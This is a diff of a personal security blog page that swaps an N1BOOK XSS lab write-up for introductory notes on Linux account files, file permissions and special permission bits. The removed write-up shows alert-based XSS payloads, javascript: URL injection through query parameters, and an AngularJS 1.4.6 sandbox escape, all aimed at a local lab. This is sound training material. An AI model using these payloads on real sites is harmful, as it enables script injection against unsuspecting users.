@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="N1BOOK-XSS, 4CH4N ZKUAN">
+    <meta name="keywords" content="Linux-Security, 4CH4N ZKUAN">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>N1BOOK-XSS | 4CH4N ZKUAN</title>
+    <title>Linux-Security | 4CH4N ZKUAN</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -184,12 +184,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/xss.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/kali.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">N1BOOK-XSS</h1>
+                    <h1 class="description center-align post-title">Linux-Security</h1>
                 </div>
             </div>
         </div>
@@ -309,8 +309,8 @@
                                 <span class="chip bg-color">Security</span>
                             </a>
                         
-                            <a href="/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
                             </a>
                         
                     </div>
@@ -349,164 +349,175 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="N1BOOK-XSS"><a href="#N1BOOK-XSS" class="headerlink" title="N1BOOK-XSS"></a>N1BOOK-XSS</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>直接构造payload看网页反应</p>
-<p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p>
-<p>审计源代码</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>
-    	<span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    		location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>
-    	<span class="token punctuation">}</span>
-    	<span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert(/xss/)&lt;/script&gt;'</span><span class="token punctuation">;</span>
-    	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+                <h1 id="Linux系统安全"><a href="#Linux系统安全" class="headerlink" title="Linux系统安全"></a>Linux系统安全</h1><h2 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h2><h3 id="用户类型"><a href="#用户类型" class="headerlink" title="用户类型"></a>用户类型</h3><ul>
+<li>超级用户<ul>
+<li>用户名为root或者UID为0的用户，可以修改所有系统文件</li>
+</ul>
+</li>
+<li>系统用户<ul>
+<li>Linux系统所需的內建用户，不能登录，如bin、adm、lp等</li>
+</ul>
+</li>
+<li>普通用户<ul>
+<li>一般使用的用户都为普通用户</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="用户信息存储"><a href="#用户信息存储" class="headerlink" title="用户信息存储"></a>用户信息存储</h3><ul>
+<li>用户信息文件<ul>
+<li>/etc/passwd</li>
+<li>/etc/shadow</li>
+</ul>
+</li>
+<li>组信息文件<ul>
+<li>/etc/group</li>
+<li>/etc/gshadow</li>
+</ul>
+</li>
+</ul>
+<p>正常登录流程：</p>
+<p>用户登录–&gt;是否有该用户–&gt;确认用户的<code>UID</code>–&gt;核实<code>shadow</code>文件的密码–&gt;成功登录</p>
+<h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p><strong>系统识别用户的文件，所有的用户信息都在文件中记录</strong></p>
+<p><code>zkuan:x:500:500:zkuan sun:/home/zkuan:/bin/bash</code></p>
+<ol>
+<li>用户名（也被成为登录名）</li>
+<li>口令；在例子中我们看到的是x，其实密码已经被映射到<code>/etc/shadow</code>文件中</li>
+<li>UID；用户ID</li>
+<li>GID；用户组ID</li>
+<li>用户名全称，可选</li>
+<li>用户的家目录所在位置</li>
+<li>用户所用shell的类型</li>
+</ol>
+<h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><p><code>zkuan:$y$j9T$NRRMLswRhLY1$/k2zkdTk.deUPg2sx7.11WXPPXK67:18840:0:99999:7:::</code></p>
+<p><strong>passwd的影子文件，两文件互补</strong></p>
+<ol>
+<li>用户名</li>
+<li>密码（被加密）</li>
+<li>上次修改口令的时间</li>
+<li>两次修改口令的间隔</li>
+<li>两次修改口令间隔最少的天数</li>
+<li>两次修改口令间隔最多的天数</li>
+<li>在口令过期之后多少天禁用次用户</li>
+<li>用户过期日期</li>
+<li>保留字段，目前为空</li>
+</ol>
+<h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><p><strong>具有共同特性的用户集合起来就是用户组</strong></p>
+<p><code>root:x:0:root,linux</code></p>
+<ol>
+<li>用户组名称</li>
+<li>用户组密码</li>
+<li>GID</li>
+<li>用户列表，每个用户之间用<code>,</code>号分割</li>
+</ol>
+<h4 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h4><p><strong>/etc/group的加密文件</strong></p>
+<p><code>groupname:x:admin:admin</code></p>
+<ol>
+<li>用户组</li>
+<li>用户组密码</li>
+<li>用户组管理者</li>
+<li>用户组成员</li>
+</ol>
+<h3 id="用户认证方式"><a href="#用户认证方式" class="headerlink" title="用户认证方式"></a>用户认证方式</h3><h4 id="用户名-密码（SSH、Telnet、FTP）"><a href="#用户名-密码（SSH、Telnet、FTP）" class="headerlink" title="用户名+密码（SSH、Telnet、FTP）"></a>用户名+密码（SSH、Telnet、FTP）</h4><ul>
+<li>包含数字、字母、下划线</li>
+<li>容易暴力破解、密码丢失</li>
+</ul>
+<h4 id="基于证书（秘钥）"><a href="#基于证书（秘钥）" class="headerlink" title="基于证书（秘钥）"></a>基于证书（秘钥）</h4><ul>
+<li>公钥保存在远程服务器，专用秘钥保存在本地</li>
+<li>通过本地秘钥与服务器公钥进行配对认证登录</li>
+<li>避免暴力破解</li>
+</ul>
+<h4 id="PAM（Pluggable-Authentication-Modules）"><a href="#PAM（Pluggable-Authentication-Modules）" class="headerlink" title="PAM（Pluggable Authentication Modules）"></a>PAM（Pluggable Authentication Modules）</h4><ul>
+<li>适用于本地登录与远程登录的机制</li>
+<li>很大灵活性，通过配置文件可设置多重认证方式，不同登录方式及不同策略</li>
+<li>安全性较强</li>
+</ul>
+<h3 id="用户访问文件权限分配"><a href="#用户访问文件权限分配" class="headerlink" title="用户访问文件权限分配"></a>用户访问文件权限分配</h3><p><code>drwxr-xr-x  3 zkuan zkuan      4096  8月  1 23:11  .vscode</code></p>
+<ol>
+<li>d:文件类型：<code>d</code>为文件夹，<code>-</code>为文件</li>
+<li>rwx:文件拥有者的权限（User）</li>
+<li>r-x:文件拥有者所在组其他用户的权限（Group）</li>
+<li>r-x:系统中其他用户权限（Other）</li>
+<li>2:链接数</li>
+<li>zkuan:文件拥有者UID</li>
+<li>zkuan:文件拥有者GID</li>
+<li>4096:文件大小</li>
+<li>8月  1 23:11:最后修改时间</li>
+<li>.vscode:文件名</li>
+</ol>
+<h3 id="权限表示方式"><a href="#权限表示方式" class="headerlink" title="权限表示方式"></a>权限表示方式</h3><p><strong>r–&gt;读(4)、w–&gt;写(2)、x–&gt;执行(1)</strong></p>
+<p>chmod命令给文件设置权限：</p>
 <blockquote>
-<p>escape()函数对字符串进行了编码</p>
+<p>chmod 777 config</p>
+<p>chmod u=rwx config</p>
 </blockquote>
-<p>发现<code>&lt;script&gt;alert()&lt;/script&gt;</code>被username用单引号包裹，尝试闭合，并将后面的单引号注释掉。</p>
-<p>写入payload：<code>username=';alert();//</code></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p>
-<p>审计源代码：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>
-    	<span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    		location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>
-    	<span class="token punctuation">}</span>
-    	<span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert()&lt;/script&gt;'</span><span class="token punctuation">;</span>
-    	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> username<span class="token punctuation">;</span>
-    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>payload被包裹，尝试闭合：<code>var username = '\';alert();';</code></p>
-<p>单引号被转义，尝试两个单引号：<code>'';alert();//</code></p>
-<p>闭合成功：<code>var username = '\'';alert();//';</code></p>
-<h4 id="还有另外一种方法"><a href="#还有另外一种方法" class="headerlink" title="还有另外一种方法"></a>还有另外一种方法</h4><p>写入<code>&lt;img&gt;</code>标签，<code>alert()</code>用onclick等以<strong>on</strong>开头的事件表示。</p>
-<p>payload：<code>&lt;img src=1 onclick=alert();&gt;</code></p>
-<p><code>on</code>事件概览：</p>
-<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/incident.jpeg"></p>
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>查看源代码：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>
-    	<span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
-    	<span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>
-    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    		jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>
-    	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    		jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    	<span class="token punctuation">}</span>
-    	<span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    	<span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    		<span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    			location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>
-    		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    			time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>
-    			document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">页面</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">秒后将会重定向到</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
-    			<span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    		<span class="token punctuation">}</span>
-    	<span class="token punctuation">}</span>
-		<span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span>
-		<span class="token punctuation">{</span>
-		       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-		               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-		       <span class="token punctuation">}</span>
-		       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token punctuation">}</span>
-    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>XSS 伪链接</p>
-<p><code>javascript:alert(/xss/)</code>并不会定向到其他页面，而是在当前页面执行<code>alert(/xss/)</code>。</p>
-<h3 id="windows-location属性"><a href="#windows-location属性" class="headerlink" title="windows.location属性"></a><strong>windows.location</strong>属性</h3><table>
+<table>
 <thead>
 <tr>
-<th>属性</th>
-<th>描述</th>
+<th>-rw——-(600)</th>
+<th>只有拥有者有读、写权限</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>hash</td>
-<td>设置或返回从#开始的URL（锚）</td>
+<td><strong>-rw-r–r–</strong>(644)</td>
+<td><strong>只有拥有者有读、写权限；而组用户和其他用户只有读权限</strong></td>
 </tr>
 <tr>
-<td>host</td>
-<td>设置或返回主机名和当前URL的端口号</td>
+<td>-rwx——(700)</td>
+<td><strong>只有拥有者有读、写、执行权限</strong></td>
 </tr>
 <tr>
-<td>hostname</td>
-<td>设置或返回当前URL的主机名</td>
+<td>-rwxr-xr-x(755)</td>
+<td><strong>拥有者读、写、执行；组用户和其他用户只有读、执行权限</strong></td>
 </tr>
 <tr>
-<td>href</td>
-<td>设置或返回完整的URL</td>
+<td>-rwx–x–x(711)</td>
+<td><strong>拥有者读、写、执行；组用户和其他用户只有执行权限</strong></td>
 </tr>
 <tr>
-<td>pathname</td>
-<td>设置或返回当前URL的路径部分</td>
+<td>-rw-rw-rw-(666)</td>
+<td><strong>所有用户都有读、写权限</strong></td>
 </tr>
 <tr>
-<td>port</td>
-<td>设置或返回当前URL的端口号</td>
-</tr>
-<tr>
-<td>protocol</td>
-<td>设置或返回当前URL的协议</td>
-</tr>
-<tr>
-<td>search</td>
-<td>设置或返回从?开始的URL（查询部分）</td>
+<td>-rwxrwxrwx(777)</td>
+<td><strong>所有用户都有读、写、执行权限</strong></td>
 </tr>
 </tbody></table>
-<p><code>function getQueryVariable()</code>中的<code>window.location.search.substring(1);</code>表示了返回从<code>?</code>开始的URL</p>
-<p><code>jumpUrl</code>为注入点，构造payload：<code>http://127.0.0.1:3000/level3?jumpUrl=javascript:alert();</code></p>
-<p>注入成功。</p>
-<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>审计代码：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>
-    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    		<span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    		autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token operator">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    		autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    		
-    	<span class="token punctuation">}</span>
-		<span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span>
-		<span class="token punctuation">{</span>
-		       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-		               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-		       <span class="token punctuation">}</span>
-		       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token punctuation">}</span>
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>getQueryVariable('autosubmit') !== false</code>其中<code>autosubmit</code>不能为false，需要传入值使其为true；<code>getQueryVariable('action') == false</code>其中<code>action</code>不能为false。参数之间用<code>&amp;</code>连接。</p>
-<p>构造payload：<code>?autosubmit=1&amp;action=javascript:alert(/xss/)</code></p>
-<p>注入成功。</p>
-<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>涉及到模板注入AngularJS沙箱逃逸</strong>。</p>
-<p>常规插入payload<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>及各种绕过方式都无法注入</p>
-<p>查看网页源代码</p>
-<p><code>&lt;script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt;</code></p>
-<p>引用了AngularJS框架。</p>
-<p>尝试<code>username={{2*2}}</code></p>
-<p>得到返回值<strong>4</strong>，花括号中的表达式被执行了，意味着服务器允许用户在花括号中传入命令参数，可以实现模板注入攻击。</p>
-<p>根据Wappalyzer判断，AngularJS版本为<code>1.4.6</code></p>
-<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/xssJS.png"></p>
-<p>AngularJS 1.6 版本之前有Angular沙箱，利用沙箱逃逸技术进行XSS攻击。</p>
-<p><strong>AngularJS沙箱逃逸：</strong></p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token punctuation">{</span>
-<span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span>  <span class="token comment">//'a'.构造函数.原型.charAt</span>
-<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'x=1}}};alert(1)//'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>通过覆盖原生函数charAt，可以绕过Angular表达式的沙箱且执行<code>alert(1)</code></p>
-<p>因此构造payload：</p>
-<p><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></p>
-<p>注入成功。</p>
-<p>关于AngularJS沙箱逃逸的技术分析：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/rwinch/angularjs-escaping-expression-sandbox">https://github.com/rwinch/angularjs-escaping-expression-sandbox</a></p>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p>
+<h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>全称Set User ID,当小写字母<code>s</code>出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得文件拥有者的权限</p>
+<p><code>-rwsr-xr-x 1 root root 63960  2月  7  2020 /usr/bin/passwd</code></p>
+<p>文件拥有者的执行位上出现为<code>s</code>为不是<code>x</code>，所以说passwd这个程序具有SUID权限，因此在修改用户密码时用的就是<code>sudo passwd xxx</code>命令。</p>
+<ul>
+<li>如果在浏览文件时，发现文件所有者权限的第三位为大写<code>S</code>则表明该文件SUID无效</li>
+</ul>
+<p>SUID权限机制：</p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/SUID.png"></p>
+<p><strong>使用SUID</strong>需要满足：</p>
+<ol>
+<li>SUID只对二进制文件有效，不能作用于目录或者脚本</li>
+<li>调用者对该文件有执行权</li>
+<li>在执行过程中调用者会暂时获得该文件的所有者权限</li>
+<li>权限只在程序执行的过程中有效</li>
+</ol>
+<h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>全称Set Group ID,当小写字母<code>s</code>出现在文件用户组权限位上时，对普通二进制文件和目录都有效。作用于普通文件时，和SUID类似，用户将获得该文件所属组的权限；作用于目录时，当用户对某一目录有写和执行的权，可在该目录下建立文件，而该用户在这个目录建立的文件都属于这个目录的所属组</p>
+<h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><p>全称Sticky Bit(粘滞位),小写字母<code>t</code>出现在其他用户权限的执行位上。当目录拥有SBIT权限时，该用户在这个目录下所建立的文件只有该用户和root用户可以删除。</p>
+<p><code>drwxrwxrwt 26 root root 12288 11月  4 20:41 /tmp</code></p>
+<ul>
+<li>如果目录的其他用户权限执行位是大写<code>T</code>，则SBIT权限无效。</li>
+</ul>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/tesqx.png"></p>
+<h3 id="三种特殊权限的设置"><a href="#三种特殊权限的设置" class="headerlink" title="三种特殊权限的设置"></a>三种特殊权限的设置</h3><p><strong>三个权限的对应数字为：SUID(4),SGID(2),SBIT(1)</strong></p>
+<p>假设要设置文件夹权限为<code>-rwsr-xr-x</code>,由于s在所有者权限的执行位上，s为SUID，因此原先的755要在前面加上4，用<code>chmod 4755 config</code>赋予</p>
+<p><strong>符号法设置特殊权限</strong></p>
+<p>权限中的ugoa代表的是：</p>
+<ul>
+<li>u=user</li>
+<li>g=group</li>
+<li>o=other</li>
+<li>a=all</li>
+</ul>
+<p>给所有人添加执行权限：<code>chmod a+x config</code></p>
+<p>给所有者全部权限，所属组读写，其他人读权限：<code>chmod u=rwx,g=rw,o=r config</code></p>
+<p>清除各种身份权限：<code>chmod a=- config</code></p>
 
                 
             </div>
@@ -533,7 +544,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/">https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/</a>
+                    <a href="https://whoiszkuan.github.io/2021/11/04/Linux-Security/">https://whoiszkuan.github.io/2021/11/04/Linux-Security/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -575,8 +586,8 @@
                                     <span class="chip bg-color">Security</span>
                                 </a>
                             
-                                <a href="/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
                                 </a>
                             
                         </div>
@@ -622,9 +633,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/11/04/Linux-Security/">
                     <div class="card-image">
@@ -641,9 +653,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -652,6 +664,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -674,12 +687,12 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/31/SSRF-Gopher/">
+                <a href="/2021/11/04/N1BOOK-XSS/">
                     <div class="card-image">
                         
-                        <img src="/images/ssrf.jpg" class="responsive-img" alt="SSRF-Gopher">
+                        <img src="/images/xss.png" class="responsive-img" alt="N1BOOK-XSS">
                         
-                        <span class="card-title">SSRF-Gopher</span>
+                        <span class="card-title">N1BOOK-XSS</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -690,7 +703,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
